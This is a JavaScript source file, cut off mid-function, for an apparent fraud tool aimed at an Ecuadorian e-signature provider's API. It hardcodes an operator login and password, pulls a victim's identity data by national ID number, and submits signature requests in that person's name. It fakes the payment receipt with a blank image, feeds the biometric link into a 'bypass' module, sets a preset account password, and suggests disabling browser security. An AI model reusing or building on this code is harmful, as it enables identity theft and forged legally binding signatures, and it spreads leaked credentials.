// ==========================================
// Navegación de Pestañas
// ==========================================
const tabFirma = document.getElementById('tabFirma');
const tabBypass = document.getElementById('tabBypass');
const seccionFirma = document.getElementById('seccionFirma');
const seccionBypass = document.getElementById('seccionBypass');

if (tabFirma && tabBypass) {
  tabFirma.addEventListener('click', () => {
    tabFirma.classList.add('active');
    tabBypass.classList.remove('active');
    seccionFirma.style.display = 'flex';
    seccionBypass.style.display = 'none';
  });

  tabBypass.addEventListener('click', () => {
    tabBypass.classList.add('active');
    tabFirma.classList.remove('active');
    seccionBypass.style.display = 'flex';
    seccionFirma.style.display = 'none';
  });
}

// ==========================================
// Lógica para Inyección de Trámite de Firma
// ==========================================

// Elementos del DOM para la inyección
const inyeccionForm = document.getElementById('inyeccionForm');
const xTokenInput = document.getElementById('xToken');
const nombresInput = document.getElementById('nombres');
const apellidosInput = document.getElementById('apellidos');
const cedulaInput = document.getElementById('cedula');
const rucInput = document.getElementById('ruc');
const codigoDactilarInput = document.getElementById('codigoDactilar');
const celularInput = document.getElementById('celular');
const correoInput = document.getElementById('correo');
const provinciaInput = document.getElementById('provincia');
const ciudadInput = document.getElementById('ciudad');
const parroquiaInput = document.getElementById('parroquia');
const direccionInput = document.getElementById('direccion');
const numeroTramiteInput = document.getElementById('numeroTramite');
const perfilFirmaInput = document.getElementById('perfilFirma');
const valorPagoInput = document.getElementById('valorPago');
const bancoInput = document.getElementById('banco');
const codUserTInput = document.getElementById('codUserT');
const ptoEmisionInput = document.getElementById('ptoEmision');
const fotoPagoFileInput = document.getElementById('fotoPagoFile');
const fotoPagoDropZone = document.getElementById('fotoPagoDropZone');
const quitarFotoPagoBtn = document.getElementById('quitarFotoPagoBtn');
const fotoPagoPrompt = document.getElementById('fotoPagoPrompt');
const fotoPagoPreviewContainer = document.getElementById('fotoPagoPreviewContainer');
const fotoPagoPreviewImg = document.getElementById('fotoPagoPreviewImg');
const fotoPagoNombre = document.getElementById('fotoPagoNombre');
const fotoPagoDetalle = document.getElementById('fotoPagoDetalle');
const injectBtn = document.getElementById('injectBtn');
const inyeccionCompletaBtn = document.getElementById('inyeccionCompletaBtn');
const inyeccionCompletaBtnText = document.getElementById('inyeccionCompletaBtnText');

function actualizarTextoInyeccionCompletaBtn(texto) {
  if (inyeccionCompletaBtnText) {
    inyeccionCompletaBtnText.textContent = texto;
  }
}
const consoleOutput = document.getElementById('consoleOutput');
const clearConsoleBtn = document.getElementById('clearConsoleBtn');
const autoTokenBtn = document.getElementById('autoTokenBtn');
const vigenciaFirmaSelect = document.getElementById('vigenciaFirma');

// Escuchar cambios en la vigencia seleccionada para actualizar los campos fijos avanzados
if (vigenciaFirmaSelect) {
  vigenciaFirmaSelect.addEventListener('change', () => {
    const selectedOption = vigenciaFirmaSelect.options[vigenciaFirmaSelect.selectedIndex];
    const perfil = selectedOption.value;
    const precio = selectedOption.getAttribute('data-precio');

    if (perfilFirmaInput) perfilFirmaInput.value = perfil;
    if (valorPagoInput) valorPagoInput.value = precio;

    addLog('system', `Vigencia seleccionada: ${selectedOption.text} (Perfil: ${perfil}, Precio: $${precio})`);
  });
}

// Selector y presets de correo electrónico
const correoSelect = document.getElementById('correoSelect');
const btnPresetCorreos = document.querySelectorAll('.btn-preset-correo');

if (correoSelect && correoInput) {
  correoSelect.addEventListener('change', () => {
    if (correoSelect.value) {
      correoInput.value = correoSelect.value;
    }
  });

  correoInput.addEventListener('input', () => {
    if (correoInput.value === 'm17800305@gmail.com') {
      correoSelect.value = 'm17800305@gmail.com';
    } else if (correoInput.value === 'f2536890@gmail.com') {
      correoSelect.value = 'f2536890@gmail.com';
    } else {
      correoSelect.value = '';
    }
  });
}

if (btnPresetCorreos && correoInput) {
  btnPresetCorreos.forEach(btn => {
    btn.addEventListener('click', () => {
      const email = btn.getAttribute('data-correo');
      if (email) {
        correoInput.value = email;
        if (correoSelect) correoSelect.value = email;
      }
    });
  });
}

// ==========================================
// Autocompletar Token Automáticamente
// ==========================================
async function renovarToken() {
  if (autoTokenBtn) {
    autoTokenBtn.disabled = true;
    autoTokenBtn.innerHTML = 'Obteniendo...';
  }
  addLog('info', 'Obteniendo nuevo token automáticamente desde el servidor...');

  try {
    const response = await fetch("https://apifirmas.firmasecuador.com/api/auth/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "accept": "application/json, text/plain, */*"
      },
      body: JSON.stringify({
        user: "1311004103",
        password: "Mayra2026."
      })
    });

    if (!response.ok) {
      throw new Error(`Error en login: ${response.status} ${response.statusText}`);
    }

    const data = await response.json();
    if (data.token) {
      if (xTokenInput) {
        xTokenInput.value = data.token;
      }
      addLog('success', '¡Token renovado y actualizado con éxito!');

      // Decodificar y mostrar vencimiento
      try {
        const parts = data.token.split('.');
        if (parts.length === 3) {
          const payloadDecoded = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
          if (payloadDecoded.exp) {
            const expDate = new Date(payloadDecoded.exp * 1000);
            addLog('info', `El nuevo token expira el: ${expDate.toLocaleString()}`);
          }
        }
      } catch (e) { }

    } else {
      addLog('error', 'El servidor no devolvió un token válido.');
      addLog('json', data, true);
    }
  } catch (error) {
    addLog('error', `Error al obtener token inicial: ${error.message}`);
    addLog('warn', 'Nota sobre CORS: Si hay error de conexión, asegúrate de tener activada la extensión de CORS o el navegador sin seguridad.');
  } finally {
    if (autoTokenBtn) {
      autoTokenBtn.disabled = false;
      autoTokenBtn.innerHTML = 'Autocompletar Token';
    }
  }
}

if (autoTokenBtn) {
  autoTokenBtn.addEventListener('click', renovarToken);
}

// Ejecutar automáticamente al cargar/refrescar la página
window.addEventListener('DOMContentLoaded', renovarToken);

// Nuevos elementos para búsqueda automática de cédula
const buscarCedulaBtn = document.getElementById('buscarCedulaBtn');
const fotoCedulaContainer = document.getElementById('fotoCedulaContainer');
const fotoCedulaImg = document.getElementById('fotoCedulaImg');
const fotoCedulaNombre = document.getElementById('fotoCedulaNombre');

// Elementos de la sección Validación Biométrica (Bypass)
const bypassCedulaInput = document.getElementById('bypassCedulaInput');
const bypassBuscarCedulaBtn = document.getElementById('bypassBuscarCedulaBtn');
const bypassNombreCompleto = document.getElementById('bypassNombreCompleto');
const bypassLinkInput = document.getElementById('bypassLink');
const bypassBase64Input = document.getElementById('bypassBase64Input');
const bypassFotoFile = document.getElementById('bypassFotoFile');
const bypassFotoPreview = document.getElementById('bypassFotoPreview');
const bypassPreviewWrapper = document.getElementById('bypassPreviewWrapper');
const bypassBtn = document.getElementById('bypassBtn');
const bypassFotoSistema = document.getElementById('bypassFotoSistema');
const bypassFotoSistemaPlaceholder = document.getElementById('bypassFotoSistemaPlaceholder');
const bypassFotoGenerada = document.getElementById('bypassFotoGenerada');
const bypassFotoGeneradaPlaceholder = document.getElementById('bypassFotoGeneradaPlaceholder');
const passLinkInput = document.getElementById('passLinkInput');
const enviarPassBtn = document.getElementById('enviarPassBtn');
const newPassInput = document.getElementById('newPassInput');
const confirmPassInput = document.getElementById('confirmPassInput');

let bypassBase64Image = null;

let fotoPagoBase64 = "";
let fotoPagoMimetype = "";

// Imagen JPEG blanca mínima de 1x1 píxeles para envío por defecto
const DEFAULT_FOTO_PAGO = "/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=";

// Función para reparar y sanitizar cadenas Base64 con saltos de línea (\n, \r), caracteres de escape o padding incorrecto
function repararYSanitizarBase64(rawStr) {
  if (!rawStr) return { cleanBase64: '', dataUrl: '', mime: 'image/jpeg' };
  let str = String(rawStr).trim();

  // Eliminar comillas envolventes si fue copiado de un JSON
  if ((str.startsWith('"') && str.endsWith('"')) || (str.startsWith("'") && str.endsWith("'"))) {
    str = str.slice(1, -1).trim();
  }

  // Extraer prefijo data URI si ya existe
  let mime = 'image/jpeg';
  const prefixMatch = str.match(/^data:([^;,]+)(?:;charset=[^;,]+)?;base64,/i);
  if (prefixMatch) {
    mime = prefixMatch[1] || 'image/jpeg';
    str = str.slice(prefixMatch[0].length);
  }

  // Eliminar saltos de línea literales (\n, \r, \\n, \\r) y espacios en blanco que dañan el Base64 en el navegador
  str = str.replace(/\\n/g, '')
           .replace(/\\r/g, '')
           .replace(/\r/g, '')
           .replace(/\n/g, '')
           .replace(/\s+/g, '');

  // Decodificar si venía con codificación URL (%2B, %2F, %3D)
  if (str.includes('%')) {
    try {
      str = decodeURIComponent(str);
    } catch (e) {}
  }

  // Convertir Base64 seguro para URL (- y _) a Base64 estándar (+ y /)
  str = str.replace(/-/g, '+').replace(/_/g, '/');

  // Corregir relleno de padding si fue cortado
  const mod = str.length % 4;
  if (mod === 2) {
    str += '==';
  } else if (mod === 3) {
    str += '=';
  } else if (mod === 1) {
    str = str.slice(0, -1);
  }

  return {
    cleanBase64: str,
    dataUrl: `data:${mime};base64,${str}`,
    mime
  };
}

function normalizarDataUrl(str, mimeFallback = 'image/jpeg') {
  if (!str) return '';
  if (str.startsWith('http://') || str.startsWith('https://')) return str;
  return repararYSanitizarBase64(str).dataUrl;
}

// Función para limpiar campos gigantes (fotos en Base64) al mostrar en los logs
function limpiarObjetoParaLog(obj) {
  if (obj === null || obj === undefined) return obj;
  if (typeof obj !== 'object') {
    if (typeof obj === 'string' && (obj.length > 80 || obj.startsWith('data:image') || obj.startsWith('/9j/'))) {
      const kb = (obj.length / 1024).toFixed(1);
      return `<Base64 Imagen ~${kb} KB>`;
    }
    return obj;
  }

  if (Array.isArray(obj)) {
    return obj.map(item => limpiarObjetoParaLog(item));
  }

  const cleaned = {};
  for (const [key, value] of Object.entries(obj)) {
    if (
      typeof value === 'string' &&
      (key.toLowerCase().includes('foto') ||
       key.toLowerCase().includes('base64') ||
       key.toLowerCase().includes('image') ||
       value.startsWith('data:image') ||
       (value.length > 80 && /^[A-Za-z0-9+/=\r\n]+$/.test(value.slice(0, 60))))
    ) {
      const kb = (value.length / 1024).toFixed(1);
      cleaned[key] = `<Base64 Imagen ~${kb} KB>`;
    } else if (typeof value === 'object' && value !== null) {
      cleaned[key] = limpiarObjetoParaLog(value);
    } else {
      cleaned[key] = value;
    }
  }
  return cleaned;
}

// Función para agregar logs en la consola virtual
function addLog(type, message, isJson = false) {
  const timestamp = new Date().toLocaleTimeString();
  const logItem = document.createElement('div');
  logItem.className = isJson ? 'info-log' : `${type}-log`;

  if (isJson) {
    const cleaned = typeof message === 'object' ? limpiarObjetoParaLog(message) : message;
    const jsonText = typeof cleaned === 'object' ? JSON.stringify(cleaned, null, 2) : cleaned;
    logItem.textContent = `[${timestamp}] ${jsonText}`;
  } else {
    logItem.textContent = `[${timestamp}] ${message}`;
  }

  consoleOutput.appendChild(logItem);
  consoleOutput.scrollTop = consoleOutput.scrollHeight;
}

// Función centralizada para procesar el comprobante de pago
function procesarFotoPago(file, origen = 'archivo') {
  if (!file) return;
  if (!file.type.startsWith('image/')) {
    addLog('warn', 'El archivo para el comprobante de pago debe ser una imagen válida.');
    return;
  }

  addLog('info', `Procesando comprobante de pago desde ${origen}: ${file.name || 'imagen pegada'} (${(file.size / 1024).toFixed(1)} KB)...`);

  const reader = new FileReader();
  reader.onload = function (event) {
    const dataUrl = event.target.result;
    const base64Parts = dataUrl.split(',');

    fotoPagoBase64 = base64Parts[1] || "";
    fotoPagoMimetype = file.type || "image/jpeg";

    if (fotoPagoPreviewImg) fotoPagoPreviewImg.src = dataUrl;
    if (fotoPagoNombre) fotoPagoNombre.textContent = file.name ? file.name : 'Comprobante Pegado';
    if (fotoPagoDetalle) fotoPagoDetalle.textContent = `${(file.size / 1024).toFixed(1)} KB - ${fotoPagoMimetype}`;

    if (fotoPagoPrompt) fotoPagoPrompt.style.display = 'none';
    if (fotoPagoPreviewContainer) fotoPagoPreviewContainer.style.display = 'flex';
    if (quitarFotoPagoBtn) quitarFotoPagoBtn.style.display = 'inline-block';

    addLog('success', `Comprobante de pago procesado y listo (${fotoPagoMimetype}).`);
  };

  reader.onerror = function () {
    addLog('error', 'Error al leer la imagen del comprobante de pago.');
  };

  reader.readAsDataURL(file);
}

function resetearFotoPago() {
  fotoPagoBase64 = "";
  fotoPagoMimetype = "";
  if (fotoPagoFileInput) fotoPagoFileInput.value = '';
  if (fotoPagoPreviewImg) fotoPagoPreviewImg.src = '';
  if (fotoPagoPreviewContainer) fotoPagoPreviewContainer.style.display = 'none';
  if (fotoPagoPrompt) fotoPagoPrompt.style.display = 'flex';
  if (quitarFotoPagoBtn) quitarFotoPagoBtn.style.display = 'none';
  addLog('system', 'Comprobante de pago removido. Se usará la imagen demo por defecto.');
}

if (quitarFotoPagoBtn) {
  quitarFotoPagoBtn.addEventListener('click', (e) => {
    e.stopPropagation();
    resetearFotoPago();
  });
}

if (fotoPagoDropZone && fotoPagoFileInput) {
  fotoPagoDropZone.addEventListener('click', () => {
    fotoPagoFileInput.click();
  });

  fotoPagoFileInput.addEventListener('change', (e) => {
    if (e.target.files && e.target.files[0]) {
      procesarFotoPago(e.target.files[0], 'archivo seleccionado');
    }
  });

  // Pegado directo (Ctrl+V) sobre el dropzone
  fotoPagoDropZone.addEventListener('paste', (e) => {
    const items = (e.clipboardData || window.clipboardData)?.items;
    if (items) {
      for (let i = 0; i < items.length; i++) {
        if (items[i].type.indexOf('image') !== -1) {
          const file = items[i].getAsFile();
          if (file) {
            e.preventDefault();
            procesarFotoPago(file, 'portapapeles (Ctrl+V)');
            return;
          }
        }
      }
    }
  });

  // Drag & drop
  fotoPagoDropZone.addEventListener('dragover', (e) => {
    e.preventDefault();
    fotoPagoDropZone.style.borderColor = '#38bdf8';
    fotoPagoDropZone.style.background = 'rgba(56, 189, 248, 0.05)';
  });

  fotoPagoDropZone.addEventListener('dragleave', () => {
    fotoPagoDropZone.style.borderColor = '#334155';
    fotoPagoDropZone.style.background = '#0f1216';
  });

  fotoPagoDropZone.addEventListener('drop', (e) => {
    e.preventDefault();
    fotoPagoDropZone.style.borderColor = '#334155';
    fotoPagoDropZone.style.background = '#0f1216';
    if (e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files[0]) {
      procesarFotoPago(e.dataTransfer.files[0], 'arrastrar y soltar');
    }
  });
}

// Pegado global (Ctrl+V) en el formulario de inyección
document.addEventListener('paste', (e) => {
  const seccionFirma = document.getElementById('seccionFirma');
  // Solo capturar si estamos en la pestaña de firma y no enfocados en un input/textarea específico
  if (seccionFirma && seccionFirma.style.display !== 'none') {
    const activeEl = document.activeElement;
    if (activeEl && (activeEl.id === 'bypassBase64Input' || activeEl.id === 'bypassLink' || activeEl.id === 'bypassCedulaInput')) {
      return;
    }
    const items = (e.clipboardData || window.clipboardData)?.items;
    if (items) {
      for (let i = 0; i < items.length; i++) {
        if (items[i].type.indexOf('image') !== -1) {
          const file = items[i].getAsFile();
          if (file) {
            e.preventDefault();
            procesarFotoPago(file, 'portapapeles (Ctrl+V)');
            return;
          }
        }
      }
    }
  }
});

// Función reutilizable para inyectar trámite de firma (soporta ejecución directa o desacoplada con snapshot)
async function ejecutarInyeccionFirma(datosOverride = null, tokenOverride = null) {
  addLog('info', 'Iniciando proceso de inyección de trámite...');

  let token = tokenOverride || (xTokenInput ? xTokenInput.value.trim() : '');
  if (!token) {
    addLog('info', 'Token de operador vacío. Intentando renovar automáticamente...');
    await renovarToken();
    token = xTokenInput ? xTokenInput.value.trim() : '';
  }

  // Validar y decodificar x-token (JWT) para alertar expiración
  try {
    const parts = token.split('.');
    if (parts.length === 3) {
      const payloadDecoded = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
      if (payloadDecoded.exp) {
        const expDate = new Date(payloadDecoded.exp * 1000);
        const now = new Date();
        addLog('info', `Token JWT detectado de: "${payloadDecoded.nombre || 'Operador Desconocido'}"`);
        if (now > expDate) {
          addLog('warn', `¡ATENCIÓN! El token que estás usando ya expiró el ${expDate.toLocaleString()}.`);
        } else {
          addLog('info', `El token expira el: ${expDate.toLocaleString()}`);
        }
      }
    }
  } catch (err) {
    addLog('warn', 'El x-token ingresado no parece ser un JWT válido o no se pudo decodificar. Se enviará sin validar.');
  }

  const p = datosOverride || {};
  const payload = {
    apellidos: p.apellidos !== undefined ? p.apellidos : (apellidosInput ? apellidosInput.value.trim() : ''),
    api_regla_codigo: "PN_BIOMETRIA_CEDULA",
    appointmentExpirationDate: "",
    archivo_aceptacion: "",
    archivo_constitucion: "",
    archivo_nombramiento: "",
    archivo_ruc: "",
    banco: p.banco !== undefined ? p.banco : (bancoInput ? bancoInput.value.trim() : 'Banco Pichincha'),
    cargo: "",
    cedula: p.cedula !== undefined ? p.cedula : (cedulaInput ? cedulaInput.value.trim() : ''),
    celular: p.celular !== undefined ? p.celular : (celularInput ? celularInput.value.trim() : '0989410060'),
    ciudad: p.ciudad !== undefined ? p.ciudad : (ciudadInput ? ciudadInput.value.trim() : ''),
    clavefirma: "",
    codUnico: "",
    codUserT: p.codUserT !== undefined ? p.codUserT : (codUserTInput ? codUserTInput.value.trim() : '8998419'),
    codigo_dactilar: p.codigo_dactilar !== undefined ? p.codigo_dactilar : (codigoDactilarInput ? codigoDactilarInput.value.trim() : ''),
    comentario: "",
    correo: p.correo !== undefined ? p.correo : (correoInput ? correoInput.value.trim() : 'm17800305@gmail.com'),
    direccion: p.direccion !== undefined ? p.direccion : (direccionInput ? direccionInput.value.trim() : ''),
    edad: 32,
    emisor: "Enext",
    foto_frontal: "",
    foto_pago: p.foto_pago || (fotoPagoBase64 || DEFAULT_FOTO_PAGO),
    foto_posterior: "",
    foto_selfie: "",
    funcionJudicial: false,
    localizador: "",
    minetype_aceptacion: "",
    minetype_constitucion: "",
    minetype_foto_frontal: "",
    minetype_foto_pago: p.minetype_foto_pago || (fotoPagoMimetype || "image/jpeg"),
    minetype_foto_posterior: "",
    minetype_foto_selfie: "",
    minetype_nombramiento: "",
    minetype_ruc: "",
    minetype_video: "",
    nombres: p.nombres !== undefined ? p.nombres : (nombresInput ? nombresInput.value.trim() : ''),
    notificarEmisionDuplicado: true,
    numero_tramite: p.numero_tramite !== undefined ? p.numero_tramite : (numeroTramiteInput ? numeroTramiteInput.value.trim() : '12345'),
    parroquia: p.parroquia !== undefined ? p.parroquia : (parroquiaInput ? parroquiaInput.value.trim() : ''),
    perfil_firma: p.perfil_firma !== undefined ? p.perfil_firma : (perfilFirmaInput ? perfilFirmaInput.value.trim() : '021'),
    promocion: "No Aplica",
    proveedor_configurado: "Enext",
    provincia: p.provincia !== undefined ? p.provincia : (provinciaInput ? provinciaInput.value.trim() : ''),
    ptoEmision: p.ptoEmision !== undefined ? p.ptoEmision : (ptoEmisionInput ? ptoEmisionInput.value.trim() : '999'),
    recurrencia: "",
    ruc: p.ruc !== undefined ? p.ruc : (rucInput ? rucInput.value.trim() : ''),
    tipoPersona: "natural",
    tipo_clave: 0,
    tipo_documento: "CEDULA",
    tipo_tramitacion: "Biometria",
    valorPago: p.valorPago !== undefined ? p.valorPago : (valorPagoInput ? valorPagoInput.value.trim() : '5'),
    video: ""
  };

  addLog('info', 'Enviando petición POST a: https://apifirmas.firmasecuador.com/api/firmas/tramitarFirma');
  addLog('info', 'Payload enviado:');
  addLog('json', payload, true);

  const response = await fetch("https://apifirmas.firmasecuador.com/api/firmas/tramitarFirma", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "accept": "application/json, text/plain, */*",
      "x-token": token
    },
    body: JSON.stringify(payload)
  });

  addLog('info', `Respuesta HTTP recibida: ${response.status} ${response.statusText}`);

  const data = await response.json();
  addLog('success', 'Cuerpo JSON de la respuesta:');
  addLog('json', data, true);

  if (data.codigo === "1" || data.link_biometria) {
    addLog('success', '¡Trámite inyectado con éxito! Se ha generado el enlace de biometría.');

    let extractedToken = '';
    if (data.link_biometria) {
      if (typeof bypassLinkInput !== 'undefined' && bypassLinkInput) {
        bypassLinkInput.value = data.link_biometria;
        addLog('info', '[BYPASS] Enlace de validación copiado automáticamente al módulo bypass.');
      }
      extractedToken = extraerTokenDeUrl(data.link_biometria);
      if (typeof passLinkInput !== 'undefined' && passLinkInput) {
        passLinkInput.value = extractedToken;
        addLog('info', '[PASS] Token copiado automáticamente al campo de contraseña.');
      }
    }

    // Botón interactivo dentro de la consola
    const linkBtn = document.createElement('a');
    linkBtn.href = data.link_biometria || '#';
    linkBtn.target = '_blank';
    linkBtn.className = 'action-btn-link';
    linkBtn.innerHTML = '<span>Ir a validación biométrica Enext</span>';
    consoleOutput.appendChild(linkBtn);
    consoleOutput.scrollTop = consoleOutput.scrollHeight;

    return { ok: true, data, link_biometria: data.link_biometria, token: extractedToken };
  } else {
    addLog('error', `La API devolvió un estado de error: ${data.mensaje || 'Sin mensaje'}`);
    return { ok: false, data, error: data.mensaje || 'Error al inyectar trámite' };
  }
}

// Variable para rastrear la solicitud activa durante el flujo manual paso a paso
let idSolicitudManualActiva = null;

function obtenerOCrearSolicitudManual(token = '', datosExtra = {}) {
  const solicitudes = obtenerSolicitudesHistorial();

  // 1. Si tenemos un ID manual activo y existe en el historial
  if (idSolicitudManualActiva) {
    const encontrada = solicitudes.find(s => s.id === idSolicitudManualActiva);
    if (encontrada) {
      if (token && !encontrada.token) {
        actualizarEstadoSolicitud(encontrada.id, encontrada.estado, encontrada.estadoDetalle, { token });
      }
      return encontrada.id;
    }
  }

  // 2. Si hay token, buscar solicitud por token
  if (token) {
    const porToken = solicitudes.find(s => s.token === token);
    if (porToken) {
      idSolicitudManualActiva = porToken.id;
      return porToken.id;
    }
  }

  // 3. Buscar por cédula actual
  const cedulaActual = (cedulaInput ? cedulaInput.value.trim() : '') || (bypassCedulaInput ? bypassCedulaInput.value.trim() : '');
  if (cedulaActual) {
    const porCedula = solicitudes.find(s => s.cedula === cedulaActual && s.estado !== 'Aprobada');
    if (porCedula) {
      idSolicitudManualActiva = porCedula.id;
      if (token && !porCedula.token) {
        actualizarEstadoSolicitud(porCedula.id, porCedula.estado, porCedula.estadoDetalle, { token });
      }
      return porCedula.id;
    }
  }

  // 4. Si no existe, crearla para que quede registrada en el historial y Supabase
  const fotoReferencia = (bypassFotoSistema && bypassFotoSistema.src && !bypassFotoSistema.src.endsWith('/'))
    ? bypassFotoSistema.src
    : (fotoCedulaImg && fotoCedulaImg.src && !fotoCedulaImg.src.endsWith('/') ? fotoCedulaImg.src : bypassBase64Image);

  const nombresTxt = (nombresInput && nombresInput.value.trim()) || '';
  const apellidosTxt = (apellidosInput && apellidosInput.value.trim()) || '';

  const nuevaId = registrarNuevaSolicitud({
    estado: 'En Proceso',
    estadoDetalle: datosExtra.estadoDetalle || 'Paso 2/3: Validación biométrica manual...',
    cedula: cedulaActual,
    nombres: nombresTxt,
    apellidos: apellidosTxt,
    fotoPersona: normalizarDataUrl(fotoReferencia, 'image/jpeg'),
    comprobantePago: fotoPagoBase64 ? normalizarDataUrl(fotoPagoBase64, fotoPagoMimetype || 'image/jpeg') : normalizarDataUrl(DEFAULT_FOTO_PAGO, 'image/jpeg'),
    datosPost: {
      cedula: cedulaActual,
      nombres: nombresTxt,
      apellidos: apellidosTxt
    },
    token: token || '',
    linkBiometria: datosExtra.linkBiometria || '',
    clave: datosExtra.clave || 'Roxana22'
  });

  idSolicitudManualActiva = nuevaId;
  return nuevaId;
}

// Manejo de envío del formulario (Inyección directa manual)
inyeccionForm.addEventListener('submit', async (e) => {
  e.preventDefault();

  injectBtn.classList.add('loading');
  injectBtn.disabled = true;

  const fotoReferenciaHistorial = (bypassFotoSistema && bypassFotoSistema.src && !bypassFotoSistema.src.endsWith('/'))
    ? bypassFotoSistema.src
    : (fotoCedulaImg && fotoCedulaImg.src && !fotoCedulaImg.src.endsWith('/') ? fotoCedulaImg.src : bypassBase64Image);

  const reqId = registrarNuevaSolicitud({
    estado: 'En Proceso',
    estadoDetalle: 'Paso 1/3: Inyectando Solicitud POST...',
    cedula: cedulaInput ? cedulaInput.value.trim() : '',
    nombres: nombresInput ? nombresInput.value.trim() : '',
    apellidos: apellidosInput ? apellidosInput.value.trim() : '',
    fotoPersona: normalizarDataUrl(fotoReferenciaHistorial, 'image/jpeg'),
    comprobantePago: fotoPagoBase64 ? normalizarDataUrl(fotoPagoBase64, fotoPagoMimetype || 'image/jpeg') : normalizarDataUrl(DEFAULT_FOTO_PAGO, 'image/jpeg'),
    datosPost: {
      cedula: cedulaInput ? cedulaInput.value.trim() : '',
      nombres: nombresInput ? nombresInput.value.trim() : '',
      apellidos: apellidosInput ? apellidosInput.value.trim() : '',
      ruc: rucInput ? rucInput.value.trim() : '',
      codigo_dactilar: codigoDactilarInput ? codigoDactilarInput.value.trim() : '',
      celular: celularInput ? celularInput.value.trim() : '',
      correo: correoInput ? correoInput.value.trim() : '',
      provincia: provinciaInput ? provinciaInput.value.trim() : '',
      ciudad: ciudadInput ? ciudadInput.value.trim() : '',
      parroquia: parroquiaInput ? parroquiaInput.value.trim() : '',
      direccion: direccionInput ? direccionInput.value.trim() : '',
      banco: bancoInput ? bancoInput.value.trim() : '',
      valorPago: valorPagoInput ? valorPagoInput.value.trim() : '',
      numero_tramite: numeroTramiteInput ? numeroTramiteInput.value.trim() : '',
      perfil_firma: perfilFirmaInput ? perfilFirmaInput.value.trim() : ''
    },
    clave: 'Roxana22'
  });

  idSolicitudManualActiva = reqId;

  try {
    const res = await ejecutarInyeccionFirma();
    if (res && res.ok) {
      actualizarEstadoSolicitud(reqId, 'En Proceso', 'Paso 1/3: Trámite inyectado con éxito. Listo para biometría.', {
        token: res.token,
        linkBiometria: res.link_biometria
      });
      registrarLogSolicitud(reqId, 'success', 'Solicitud POST inyectada. Enlace obtenido. Listo para validación biométrica.');
    } else {
      const errorMsg = (res && res.error) || 'Fallo en inyección POST';
      actualizarEstadoSolicitud(reqId, 'Rechazada', errorMsg);
      registrarLogSolicitud(reqId, 'error', `Fallo en inyección POST: ${errorMsg}`);
    }
  } catch (error) {
    actualizarEstadoSolicitud(reqId, 'Rechazada', error.message);
    registrarLogSolicitud(reqId, 'error', `Error durante el envío de la solicitud: ${error.message}`);
    addLog('error', `Error durante el envío de la solicitud: ${error.message}`);
  } finally {
    injectBtn.classList.remove('loading');
    injectBtn.disabled = false;
  }
});

// Limpieza de Logs
clearConsoleBtn.addEventListener('click', () => {
  consoleOutput.innerHTML = '';
  addLog('system', 'Consola limpia. Lista para inyección...');
});

// ==================================================
// Lógica para Consulta y Autocompletado de Cédula
// ==================================================

// Función para separar nombres y apellidos dinámicamente
function separarNombresYApellidos(nombreCompleto) {
  const partes = nombreCompleto.trim().split(/\s+/);
  if (partes.length >= 4) {
    // e.g. "CENTENO HOLGUIN KEVIN JULIAN" -> apellidos: "CENTENO HOLGUIN", nombres: "KEVIN JULIAN"
    const apellidos = partes.slice(0, 2).join(' ');
    const nombres = partes.slice(2).join(' ');
    return { nombres, apellidos };
  } else if (partes.length === 3) {
    // Asumimos primer apellido y el resto nombres
    const apellidos = partes[0];
    const nombres = partes.slice(1).join(' ');
    return { nombres, apellidos };
  } else if (partes.length === 2) {
    return { apellidos: partes[0], nombres: partes[1] };
  }
  return { nombres: nombreCompleto, apellidos: '' };
}

async function consultarCedula(isBypass = false) {
  // Tomar cédula del input activo o de cualquiera que tenga valor
  let cedula = "";
  if (isBypass && bypassCedulaInput && bypassCedulaInput.value.trim()) {
    cedula = bypassCedulaInput.value.trim();
  } else if (cedulaInput && cedulaInput.value.trim()) {
    cedula = cedulaInput.value.trim();
  } else if (bypassCedulaInput && bypassCedulaInput.value.trim()) {
    cedula = bypassCedulaInput.value.trim();
  }

  if (!cedula) {
    addLog('warn', 'Por favor, ingresa un número de cédula válido para consultar.');
    return;
  }

  // Sincronizar de inmediato el valor en ambos campos de cédula
  if (cedulaInput) cedulaInput.value = cedula;
  if (bypassCedulaInput) bypassCedulaInput.value = cedula;

  addLog('info', `Iniciando consulta de cédula: ${cedula}...`);
  if (buscarCedulaBtn) {
    buscarCedulaBtn.disabled = true;
    buscarCedulaBtn.innerHTML = 'Buscando...';
    buscarCedulaBtn.classList.add('loading');
  }
  if (bypassBuscarCedulaBtn) {
    bypassBuscarCedulaBtn.disabled = true;
    bypassBuscarCedulaBtn.innerHTML = 'Buscando...';
    bypassBuscarCedulaBtn.classList.add('loading');
  }

  try {
    const response = await fetch("https://apifirmas.firmasecuador.com/api/usuarios/consultarCedulaPublica", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "accept": "application/json, text/plain, */*"
      },
      body: JSON.stringify({ cedula })
    });

    addLog('info', `Respuesta HTTP recibida de consultarCedula: ${response.status} ${response.statusText}`);

    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`Error en la consulta: ${response.status}. ${errorText}`);
    }

    const data = await response.json();
    addLog('success', 'Datos obtenidos de consultarCedula:');
    addLog('json', data, true);

    if (data.identificacion) {
      // 1. Sincronizar Cédula y Nombre en ambos paneles (Firma y Validación Biométrica)
      if (cedulaInput) cedulaInput.value = data.identificacion;
      if (bypassCedulaInput) bypassCedulaInput.value = data.identificacion;
      if (bypassNombreCompleto) {
        bypassNombreCompleto.textContent = data.nombres || data.identificacion;
      }

      // 2. Separar nombres y apellidos para formulario de Firma
      let primerApellido = "";
      if (data.nombres) {
        const { nombres, apellidos } = separarNombresYApellidos(data.nombres);
        if (nombresInput) nombresInput.value = nombres;
        if (apellidosInput) apellidosInput.value = apellidos;
        primerApellido = apellidos.split(' ')[0] || "";
      }

      // 3. Establecer RUC (Cédula + 001)
      if (rucInput) rucInput.value = `${data.identificacion}001`;

      // 4. Fijar Nueva Contraseña en Roxana22
      if (newPassInput) newPassInput.value = 'Roxana22';
      if (confirmPassInput) confirmPassInput.value = 'Roxana22';

      // 5. Código dactilar
